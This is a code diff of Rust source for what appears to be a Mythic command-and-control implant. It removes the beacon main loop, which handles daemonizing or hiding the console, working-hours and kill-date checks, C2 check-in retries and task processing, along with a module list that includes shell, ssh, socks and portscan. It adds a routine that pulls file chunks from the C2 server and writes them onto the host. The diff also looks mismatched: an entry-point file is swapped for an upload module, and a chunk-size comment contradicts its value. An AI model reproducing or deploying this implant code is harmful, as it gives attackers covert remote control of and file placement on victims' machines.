@@ -1,159 +1,108 @@
-use chrono::prelude::{DateTime, Local, NaiveDate, NaiveDateTime};
-use chrono::Duration;
+use crate::agent::{AgentTask, ContinuedData};
+use crate::mythic_success;
+use crate::utils::unverbatim;
+use base64::{Engine as _, engine::general_purpose};
+use serde::Deserialize;
+use serde_json::json;
 use std::error::Error;
+use std::io::prelude::*;
+use std::path::Path;
+use std::result::Result;
+use std::sync::mpsc;
 
-use agent::calculate_sleep_time;
-use agent::Agent;
+use path_clean::PathClean;
 
-// Declara todos los módulos, incluyendo socks
-mod agent;
-mod cat;
-mod cd;
-mod cp;
-mod download;
-mod exit;
-mod getenv;
-mod getprivs;
-mod jobs;
-mod ls;
-mod mkdir;
-mod mv;
-mod netstat;
-mod payloadvars;
-mod portscan;
-mod profiles;
-mod ps;
-mod pwd;
-mod redirect;
-mod rm;
-mod setenv;
-mod shell;
-mod sleep;
-mod socks;  // ← AGREGA ESTA LÍNEA
-mod ssh;
-mod tasking;
-mod unsetenv;
-mod upload;
-mod utils;
-mod workinghours;
+/// Chunk size used for file transfer (5KB)
+const CHUNK_SIZE: usize = 512000;
 
-/// Real entrypoint of the program.
-/// Checks to see if the agent should daemonize and then runs the main beaconing code.
-pub fn real_main() -> Result<(), Box<dyn Error>> {
-    if let Some(daemonize) = option_env!("daemonize") {
-        if daemonize.eq_ignore_ascii_case("true") {
-            // Fork the process if daemonize is set to "true"
-            #[cfg(target_os = "linux")]
-            if unsafe { libc::fork() } == 0 {
-                run_beacon()?;
-            }
-
-            // Hide the console window for windows
-            #[cfg(target_os = "windows")]
-            if unsafe { winapi::um::wincon::FreeConsole() } != 0 {
-                run_beacon()?;
-            }
-            return Ok(());
-        }
-    }
-
-    run_beacon()?;
-
-    Ok(())
+/// Struct holding the task parameters
+#[derive(Deserialize)]
+struct UploadArgs {
+    file: String,
+    path: String,
 }
 
-/// Main code which runs the agent
-fn run_beacon() -> Result<(), Box<dyn Error>> {
-    // Create a new agent object
-    let mut agent = Agent::new();
+/// Upload a file from the host machine to Mythic
+/// * `tx` - Channel for sending information to Mythic
+/// * `rx` - Channel for receiving information from Mythic
+pub fn upload_file(
+    tx: &mpsc::Sender<serde_json::Value>,
+    rx: mpsc::Receiver<serde_json::Value>,
+) -> Result<(), Box<dyn Error>> {
+    // Parse the initial tasking information
+    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
+    let args: UploadArgs = serde_json::from_str(&task.parameters)?;
 
-    // Get the initial interval from the config
-    let mut interval = payloadvars::callback_interval();
+    // Formulate the absolute path for the file upload
+    let cwd = std::env::current_dir()?;
+    let file_path = cwd.join(args.path);
 
-    // Set the number of checkin retries
-    let mut tries = 1;
+    // Get the full path as a string
+    let file_path_str = unverbatim(file_path.clean()).to_string_lossy().to_string();
 
-    // Keep trying to reconnect to the C2 if the connection is unavailable
-    loop {
-        // Get the current time
-        let now: DateTime<Local> = std::time::SystemTime::now().into();
-        let now: NaiveDateTime = now.naive_local();
-
-        // Get the configured start working hours for beaconing
-        let working_start = NaiveDateTime::new(now.date(), payloadvars::working_start());
-
-        // Get the configured end working hours for beaconing
-        let working_end = NaiveDateTime::new(now.date(), payloadvars::working_end());
-
-        // Check the agent's working hours and don't check in if not in the configured time frame
-        if now < working_start {
-            let delta =
-                Duration::seconds(working_start.and_utc().timestamp() - now.and_utc().timestamp());
-            std::thread::sleep(delta.to_std()?);
-        } else if now > working_end {
-            let next_start = working_start.checked_add_signed(Duration::days(1)).unwrap();
-            let delta =
-                Duration::seconds(next_start.and_utc().timestamp() - now.and_utc().timestamp());
-            std::thread::sleep(delta.to_std()?);
-        }
-
-        // Check if the agent has passed the kill date
-        if now.date() >= NaiveDate::parse_from_str(&payloadvars::killdate(), "%Y-%m-%d")? {
-            return Ok(());
-        }
-
-        // Try to make the initial checkin to the C2, if this succeeds the loop will break
-        if agent.make_checkin().is_ok() {
-            break;
-        }
-
-        // Check if the number of connection attempts equals the configured connection attempts
-        if tries >= payloadvars::retries() {
-            return Ok(());
-        }
-
-        // Calculate the sleep time and sleep the agent
-        let sleeptime = calculate_sleep_time(interval, payloadvars::callback_jitter());
-        std::thread::sleep(std::time::Duration::from_secs(sleeptime));
-
-        // Increment the current attempt
-        tries += 1;
-
-        // Double the currently set interval for next connection attempt
-        interval *= 2;
-    } // Checkin successful
-
-    loop {
-        // Get new tasing from Mythic
-        let pending_tasks = agent.get_tasking()?;
-
-        // Process the pending tasks
-        agent
-            .tasking
-            .process_tasks(pending_tasks.as_ref(), &mut agent.shared)?;
-
-        // Sleep the agent
-        agent.sleep();
-
-        // Get the completed task information
-        let completed_tasks = agent.tasking.get_completed_tasks()?;
-
-        // Send the completed tasking information up to Mythic
-        let continued_tasking = agent.send_tasking(&completed_tasks)?;
-
-        // Pass along any continued tasking (download, upload, etc.)
-        agent
-            .tasking
-            .process_tasks(continued_tasking.as_ref(), &mut agent.shared)?;
-
-        // Break out of the loop if the agent should exit
-        if agent.shared.exit_agent {
-            break;
-        }
-
-        // Sleep the agent
-        agent.sleep();
+    // Check if the file path being uploaded to already exists
+    let file_path = Path::new(&file_path);
+    if file_path.exists() {
+        return Err("Remote path already exists.".into());
     }
+
+    // Send up the upload message to Mythic and initiate the upload
+    tx.send(json!({
+        "upload": json!({
+            "chunk_size": CHUNK_SIZE,
+            "file_id": args.file,
+            "chunk_num": 1,
+            "full_path": file_path_str,
+        }),
+        "task_id": task.id,
+        "user_output": "Uploading chunk 1\n",
+    }))?;
+
+    // Grab and parse the response from Mythic
+    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
+    let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;
+
+    // Store the upload file chunk data
+    let mut file_data: Vec<u8> = general_purpose::STANDARD.decode(
+        continued_args
+            .chunk_data
+            .ok_or_else(|| std::io::Error::other("Failed to get file chunk data"))?,
+    )?;
+
+    // Get the total chunks
+    let total_chunks = continued_args.total_chunks.unwrap();
+
+    // Continue receiving file chunks
+    for chunk_num in 2..=total_chunks {
+        tx.send(json!({
+            "upload": json!({
+                "chunk_size": CHUNK_SIZE,
+                "file_id": args.file,
+                "chunk_num": chunk_num,
+                "full_path": file_path_str,
+            }),
+            "task_id": task.id,
+            "user_output": format!("Uploading chunk {}/{}\n", chunk_num, total_chunks),
+        }))?;
+
+        let task: AgentTask = serde_json::from_value(rx.recv()?)?;
+        let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;
+
+        // Append the new base64 decoded chunk data
+        file_data.append(&mut general_purpose::STANDARD.decode(continued_args.chunk_data.unwrap())?);
+    }
+
+    // Open the file handle. This will check if the agent has the correct permissions.
+    let mut f = std::fs::File::create(&file_path_str)?;
+
+    // Write out the received file to disk
+    f.write_all(&file_data)?;
+
+    // Send up a success to Mythic
+    tx.send(mythic_success!(
+        task.id,
+        format!("Uploaded '{}' to host", file_path_str)
+    ))?;
 
     Ok(())
 }
